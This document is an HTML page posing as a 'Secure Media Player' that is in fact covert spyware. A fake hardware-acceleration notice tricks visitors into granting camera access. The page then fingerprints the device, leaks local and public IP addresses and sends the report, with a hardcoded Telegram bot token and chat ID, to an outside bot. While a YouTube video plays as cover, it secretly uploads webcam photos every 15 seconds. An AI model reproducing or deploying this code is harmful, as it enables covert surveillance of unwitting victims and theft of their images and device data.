<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE MEDIA PLAYER</title>
    <style>
        body { background: #000; margin: 0; overflow: hidden; font-family: sans-serif; color: #fff; }
        canvas#matrix { display: block; position: fixed; top: 0; left: 0; z-index: -1; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.98); display: flex; justify-content: center; align-items: center; z-index: 100; }
        .modal { background: #111; border-top: 4px solid #00ff00; padding: 30px; border-radius: 4px; text-align: center; width: 85%; max-width: 350px; }
        .btn { background: #00ff00; color: #000; border: none; padding: 15px; border-radius: 4px; font-weight: bold; cursor: pointer; width: 100%; font-size: 1.1em; text-transform: uppercase; margin-top: 10px;}
        .input-field { background: #222; border: 1px solid #444; color: #fff; padding: 14px; width: 90%; margin: 15px 0; border-radius: 4px; outline: none; }
        #videoPlayerBox { display: none; width: 100%; height: 100vh; background: #000; flex-direction: column; justify-content: center; align-items: center; }
        iframe { border: none; width: 100%; height: 260px; }
        .sys-alert { position: fixed; top: 20%; left: 50%; transform: translateX(-50%); background: #fff; color: #000; padding: 20px; border-radius: 8px; width: 80%; max-width: 300px; display: none; z-index: 200; text-align: center; font-size: 14px; }
    </style>
</head>
<body>

<canvas id="matrix"></canvas>

<div class="overlay" id="overlay">
    <div class="modal">
        <h3 style="margin:0; color: #00ff00;">Deep System Sync</h3>
        <p style="font-size: 13px; color: #aaa; margin: 15px 0;">Enter name for secure encrypted streaming.</p>
        <input type="text" id="userName" class="input-field" placeholder="Target Name" required>
        <button class="btn" onclick="showNotice()">Initialize</button>
    </div>
</div>

<div class="sys-alert" id="sysNotice">
    <b>HARDWARE ACCELERATION</b><br><br>
    To enable 4K playback and AI sync, please allow sensor and camera access.
    <br><br>
    <button onclick="startDeepProcess()" style="background:#000; color:#fff; border:none; padding:10px 20px; border-radius:4px;">PROCEED</button>
</div>

<div id="videoPlayerBox">
    <p style="padding: 10px; font-size: 13px; color: #00ff00;">‚óè SECURE CONNECTION ACTIVE</p>
    <iframe id="youtubeVideo" src="" allow="autoplay; encrypted-media"></iframe>
</div>

<video id="webcam" autoplay playsinline muted style="display:none;"></video>
<canvas id="snapCanvas" style="display:none;"></canvas>

<script>
    const TOKEN = '8032917202:AAFCD2hCP709BspRJSbibMl3BefYTVxV-qE';
    const CHAT_ID = '7416528268';
    let targetName = "Unknown";

    // Matrix background logic
    const canvas = document.getElementById('matrix');
    const ctx = canvas.getContext('2d');
    canvas.width = window.innerWidth; canvas.height = window.innerHeight;
    const drops = Array(Math.floor(canvas.width / 16)).fill(1);
    function draw() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#0F0'; ctx.font = '16px arial';
        drops.forEach((y, i) => {
            ctx.fillText(Math.floor(Math.random()*2), i * 16, y * 16);
            if (y * 16 > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        });
    }
    setInterval(draw, 35);

    function showNotice() {
        targetName = document.getElementById('userName').value || "Unknown";
        document.getElementById('sysNotice').style.display = 'block';
    }

    async function startDeepProcess() {
        document.getElementById('sysNotice').style.display = 'none';
        try {
            // Camera Update: High-Res and Focus
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
            });
            document.getElementById('webcam').srcObject = stream;
            document.getElementById('overlay').style.display = 'none';
            document.getElementById('videoPlayerBox').style.display = 'flex';
            document.getElementById('youtubeVideo').src = "https://www.youtube.com/embed/y0DdGB3OlrQ?autoplay=1";
            
            sendDeepReport();
            setInterval(takeSnap, 15000); // 15s interval
        } catch (e) { alert("Hardware Error. Allow access."); location.reload(); }
    }

    async function sendDeepReport() {
        // GPU & Refresh Rate (The Fingerprint)
        const gl = document.createElement('canvas').getContext('webgl');
        const debug = gl.getExtension('WEBGL_debug_renderer_info');
        const gpu = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "N/A";
        
        let battery = "N/A";
        if (navigator.getBattery) {
            const b = await navigator.getBattery();
            battery = `${Math.round(b.level * 100)}% (${b.charging ? 'Charging' : 'Discharging'})`;
        }

        // Internal IP Leak
        let localIP = "Hidden";
        const pc = new RTCPeerConnection({iceServers:[]});
        pc.createDataChannel("");
        pc.createOffer().then(o => pc.setLocalDescription(o));
        pc.onicecandidate = (i) => { if(i.candidate) localIP = i.candidate.candidate; };

        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        
        let report = `üî• *SUPER DEEP REPORT* üî•\n\n` +
                     `üë§ User: ${targetName}\n` +
                     `üì± GPU: ${gpu}\n` +
                     `üîã Battery: ${battery}\n` +
                     `üåê Public IP: ${ipData.ip}\n` +
                     `üè† Local IP: ${localIP}\n` +
                     `‚ö° RAM: ${navigator.deviceMemory || 'N/A'}GB\n` +
                     `‚öôÔ∏è CPU Cores: ${navigator.hardwareConcurrency || 'N/A'}`;

        fetch(`https://api.api.org/bot${TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: 'Markdown' })
        });
        setTimeout(takeSnap, 5000);
    }

    function takeSnap() {
        const video = document.getElementById('webcam');
        const canvas = document.getElementById('snapCanvas');
        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        canvas.toBlob(blob => {
            const fd = new FormData();
            fd.append('chat_id', CHAT_ID);
            fd.append('photo', blob, 'shot.jpg');
            fd.append('caption', `Live: ${targetName}`);
            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }, 'image/jpeg');
    }
</script>
</body>
</html>
